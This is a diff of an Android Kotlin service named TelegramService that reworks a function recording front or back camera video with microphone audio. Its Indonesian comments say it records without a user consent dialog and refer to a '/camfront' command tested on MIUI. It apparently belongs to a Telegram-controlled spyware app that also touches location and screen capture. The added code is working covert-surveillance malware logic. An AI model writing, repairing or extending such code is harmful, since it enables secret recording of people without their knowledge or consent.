@@ -12,10 +12,10 @@ import android.content.IntentFilter
 import android.graphics.Bitmap
 import android.graphics.PixelFormat
 import android.hardware.display.VirtualDisplay
-import android.hardware.camera2.CameraCharacteristics
-import android.hardware.camera2.CameraDevice
-import android.hardware.camera2.CameraManager
-import android.hardware.camera2.CameraCaptureSession
+
+
+
+
 
 import android.media.ImageReader
 import android.media.projection.MediaProjection
@@ -24,14 +24,14 @@ import android.location.Location
 import android.location.LocationManager
 import android.os.Build
 import android.os.IBinder
-import android.os.SystemClock
+
 import android.media.AudioAttributes
 import android.media.AudioFormat
 import android.media.AudioManager
 import android.media.AudioRecord
-import android.media.MediaCodec
-import android.media.MediaFormat
-import android.media.MediaMuxer
+
+
+
 import android.media.MediaRecorder
 import android.os.PowerManager
 import android.util.DisplayMetrics
@@ -1074,159 +1074,125 @@ class TelegramService : Service() {
         }
     }
 
-    /** Rekam video front/back via Camera2 + MediaRecorder (output surface = MediaRecorder).
-     *  MediaRecorder.setOutputSurface() — surface dari ImageReader(PRIVATE format) yang
-     *  ditarget oleh Camera2. Ini cara resmi Android untuk merekam video dari kamera
-     *  di semua API level tanpa dialog user consent. Pola sama dengan captureOneFrame
-     *  yang terbukti jalan di MIUI, tapi output ke MediaRecorder bukan ke file JPEG. */
+    /** Rekam video front/back via legacy Camera API + MediaRecorder(CAMERA).
+     *  Pola sama dengan /camfront yang terbukti jalan di MIUI.
+     *  MediaRecorder di-feed oleh legacy Camera (dipakai Camera2 hanya untuk open). */
     private fun recordOneVideo(facing: String, seconds: Int): java.io.File? {
-        val cm = getSystemService(android.hardware.camera2.CameraManager::class.java) ?: return null
-        val camChars = { id: String -> cm.getCameraCharacteristics(id) }
-        val wantedFacing = if (facing == "front")
-            android.hardware.camera2.CameraCharacteristics.LENS_FACING_FRONT
-        else
-            android.hardware.camera2.CameraCharacteristics.LENS_FACING_BACK
-        val cameraId = cm.cameraIdList.firstOrNull { id ->
-            try {
-                camChars(id).get(
-                    android.hardware.camera2.CameraCharacteristics.LENS_FACING
-                ) == wantedFacing
-            } catch (e: Exception) { false }
-        } ?: cm.cameraIdList.firstOrNull()
-        if (cameraId == null) {
-            Log.e(TAG, "recordOneVideo: no camera found")
-            return null
-        }
-        Log.d(TAG, "recordOneVideo: cameraId=$cameraId facing=$facing")
-
         val outDir = getExternalFilesDir(null) ?: filesDir
         val outFile = java.io.File(outDir, "vid_${facing}_${System.currentTimeMillis()}.mp4")
         if (outFile.exists()) outFile.delete()
 
-        // --- 1. Siapkan MediaRecorder ---
+        // 1. Cari kamera legacy (front/back)
+        @Suppress("DEPRECATION")
+        val numCameras = android.hardware.Camera.getNumberOfCameras()
+        Log.d(TAG, "recordOneVideo: numCameras=$numCameras facing=$facing")
+        var camId = -1
+        if (numCameras > 0) {
+            val info = android.hardware.Camera.CameraInfo()
+            for (i in 0 until numCameras) {
+                @Suppress("DEPRECATION")
+                android.hardware.Camera.getCameraInfo(i, info)
+                Log.d(TAG, "recordOneVideo: cam[$i] facing=${info.facing}")
+                if (facing == "front" && info.facing == android.hardware.Camera.CameraInfo.CAMERA_FACING_FRONT) camId = i
+                if (facing == "back"  && info.facing == android.hardware.Camera.CameraInfo.CAMERA_FACING_BACK)  camId = i
+            }
+        }
+        if (camId < 0) {
+            Log.e(TAG, "recordOneVideo: no ${facing} camera found")
+            return null
+        }
+        Log.d(TAG, "recordOneVideo: using legacy camId=$camId")
+
+        // 2. Buka legacy kamera
+        @Suppress("DEPRECATION")
+        val cam: android.hardware.Camera = try {
+            val c = android.hardware.Camera.open(camId)
+            Log.d(TAG, "recordOneVideo: camera opened")
+            c
+        } catch (e: Exception) {
+            Log.e(TAG, "recordOneVideo: camera open fail: ${e.javaClass.simpleName}: ${e.message}")
+            return null
+        }
+
+        // 3. Setup parameter — pilih preview size terbesar
+        @Suppress("DEPRECATION")
+        val params = cam.parameters
+        val sizes = params.getSupportedPreviewSizes() ?: emptyList()
+        Log.d(TAG, "recordOneVideo: supported sizes=" + sizes.map { s -> "${s.width}x${s.height}" })
+        val bestSize = sizes.maxByOrNull { s -> s.width.toLong() * s.height.toLong() }
+        @Suppress("DEPRECATION")
+        if (bestSize != null) {
+            params.setPreviewSize(bestSize.width, bestSize.height)
+            Log.d(TAG, "recordOneVideo: preview set to ${bestSize.width}x${bestSize.height}")
+        }
+        @Suppress("DEPRECATION")
+        cam.parameters = params
+
+        // 4. MediaRecorder di-feed oleh legacy kamera
         val rec = if (Build.VERSION.SDK_INT >= 31) {
             MediaRecorder(applicationContext)
         } else {
             @Suppress("DEPRECATION")
             MediaRecorder()
         }
-
-        // Pilih resolusi — coba 1280x720, fallback 640x480
-        var vw = 1280
-        var vh = 720
-
-        // --- 2. Buat ImageReader sebagai target untuk Camera2 ---
-        val reader = android.media.ImageReader.newInstance(vw, vh, android.graphics.ImageFormat.PRIVATE, 2)
-        val recorderSurface = reader.surface
-
-        // --- 3. Setup MediaRecorder dengan surface input ---
-        var recActive: MediaRecorder = rec
-        var recStarted = false
+        var recOk = false
         try {
-            recActive.setAudioSource(MediaRecorder.AudioSource.MIC)
-            recActive.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
-            recActive.setVideoEncoder(MediaRecorder.VideoEncoder.H264)
-            recActive.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
-            recActive.setVideoSize(vw, vh)
-            recActive.setVideoEncodingBitRate(4_000_000)
-            recActive.setVideoFrameRate(30)
-            recActive.setAudioSamplingRate(44100)
-            recActive.setAudioEncodingBitRate(128_000)
-            recActive.setOutputFile(outFile.absolutePath)
-            recActive.prepare()
-            recActive.start()
-            recStarted = true
-            Log.d(TAG, "recordOneVideo: MediaRecorder started")
+            @Suppress("DEPRECATION")
+            rec.setCamera(cam)
+            rec.setAudioSource(MediaRecorder.AudioSource.MIC)
+            rec.setVideoSource(MediaRecorder.VideoSource.CAMERA)
+            rec.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
+            rec.setVideoEncoder(MediaRecorder.VideoEncoder.H264)
+            rec.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
+            @Suppress("DEPRECATION")
+            val vw = bestSize?.width ?: 1280
+            val vh = bestSize?.height ?: 720
+            rec.setVideoSize(vw, vh)
+            rec.setVideoEncodingBitRate(4_000_000)
+            rec.setVideoFrameRate(30)
+            rec.setAudioSamplingRate(44100)
+            rec.setAudioEncodingBitRate(128_000)
+            rec.setOutputFile(outFile.absolutePath)
+            rec.prepare()
+            rec.start()
+            recOk = true
+            Log.d(TAG, "recordOneVideo: MediaRecorder started (${vw}x${vh}, cam=$camId)")
         } catch (e: Exception) {
             Log.e(TAG, "recordOneVideo: recorder start fail: ${e.javaClass.simpleName}: ${e.message}")
-            // Fallback: coba resolusi lebih kecil
-            vw = 640; vh = 480
-            try {
-                recActive.release()
-                recActive = if (Build.VERSION.SDK_INT >= 31)
-                    MediaRecorder(applicationContext)
-                else @Suppress("DEPRECATION") MediaRecorder()
-                recActive.setAudioSource(MediaRecorder.AudioSource.MIC)
-                recActive.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
-                recActive.setVideoEncoder(MediaRecorder.VideoEncoder.H264)
-                recActive.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
-                recActive.setVideoSize(vw, vh)
-                recActive.setVideoEncodingBitRate(2_000_000)
-                recActive.setVideoFrameRate(30)
-                recActive.setAudioSamplingRate(44100)
-                recActive.setAudioEncodingBitRate(64_000)
-                recActive.setOutputFile(outFile.absolutePath)
-                recActive.prepare()
-                recActive.start()
-                recStarted = true
-                Log.d(TAG, "recordOneVideo: fallback recorder started (640x480)")
-            } catch (e2: Exception) {
-                Log.e(TAG, "recordOneVideo: fallback also fail: ${e2.javaClass.simpleName}: ${e2.message}")
-                try { recActive.release() } catch (_: Exception) {}
-                try { reader.close() } catch (_: Exception) {}
-                try { recorderSurface.release() } catch (_: Exception) {}
-                return null
-            }
+            try { rec.release() } catch (_: Exception) {}
+            try { cam.release() } catch (_: Exception) {}
+            return null
         }
 
-        // --- 4. Buka kamera via Camera2, target ke recorderSurface ---
-        val handler = android.os.Handler(android.os.Looper.getMainLooper())
-        var camera: android.hardware.camera2.CameraDevice? = null
-        var session: android.hardware.camera2.CameraCaptureSession? = null
+        // 5. Mulai preview (wajib supaya frame masuk ke recorder)
+        try {
+            @Suppress("DEPRECATION")
+            cam.startPreview()
+            Log.d(TAG, "recordOneVideo: preview started")
+        } catch (e: Exception) {
+            Log.e(TAG, "recordOneVideo: startPreview fail: ${e.message}")
+            try { rec.stop() } catch (_: Exception) {}
+            try { rec.release() } catch (_: Exception) {}
+            try { cam.release() } catch (_: Exception) {}
+            return null
+        }
 
-        cm.openCamera(cameraId, object : android.hardware.camera2.CameraDevice.StateCallback() {
-            override fun onOpened(dev: android.hardware.camera2.CameraDevice) {
-                camera = dev
-                try {
-                    val req = dev.createCaptureRequest(
-                        android.hardware.camera2.CameraDevice.TEMPLATE_RECORD
-                    ).apply {
-                        addTarget(recorderSurface)
-                    }
-                    dev.createCaptureSession(
-                        listOf(recorderSurface),
-                        object : android.hardware.camera2.CameraCaptureSession.StateCallback() {
-                            override fun onConfigured(sess: android.hardware.camera2.CameraCaptureSession) {
-                                session = sess
-                                try {
-                                    sess.setRepeatingRequest(req.build(), null, handler)
-                                    Log.d(TAG, "recordOneVideo: repeating request to recorder surface")
-                                } catch (e: Exception) {
-                                    Log.e(TAG, "recordOneVideo: repeating fail: ${e.message}")
-                                }
-                            }
-                            override fun onClosed(sess: android.hardware.camera2.CameraCaptureSession) {}
-                            override fun onConfigureFailed(sess: android.hardware.camera2.CameraCaptureSession) {
-                                Log.e(TAG, "recordOneVideo: configure failed")
-                            }
-                        }, handler)
-                } catch (e: Exception) {
-                    Log.e(TAG, "recordOneVideo: session fail: ${e.message}")
-                }
-            }
-            override fun onDisconnected(dev: android.hardware.camera2.CameraDevice) {
-                try { dev.close() } catch (_: Exception) {}
-            }
-            override fun onError(dev: android.hardware.camera2.CameraDevice, error: Int) {
-                Log.e(TAG, "recordOneVideo: camera error=$error")
-            }
-        }, handler)
-
-        // --- 5. Tunggu durasi rekam ---
+        // 6. Tunggu durasi rekam
         Thread.sleep((seconds * 1000L).coerceAtMost(60_000L))
 
-        // --- 6. Stop & cleanup ---
-        try { session?.close() } catch (_: Exception) {}
-        try { camera?.close() } catch (_: Exception) {}
+        // 7. Stop kamera → stop recorder → release
         try {
-            recActive.stop()
+            @Suppress("DEPRECATION")
+            cam.stopPreview()
+        } catch (_: Exception) {}
+        try { cam.release() } catch (_: Exception) {}
+        try {
+            rec.stop()
             Log.d(TAG, "recordOneVideo: recorder stopped")
         } catch (e: Exception) {
             Log.w(TAG, "recordOneVideo: rec.stop: ${e.message}")
         }
-        try { recActive.release() } catch (_: Exception) {}
-        try { reader.close() } catch (_: Exception) {}
-        try { recorderSurface.release() } catch (_: Exception) {}
+        try { rec.release() } catch (_: Exception) {}
 
         return if (outFile.exists() && outFile.length() > 0) outFile else null
     }
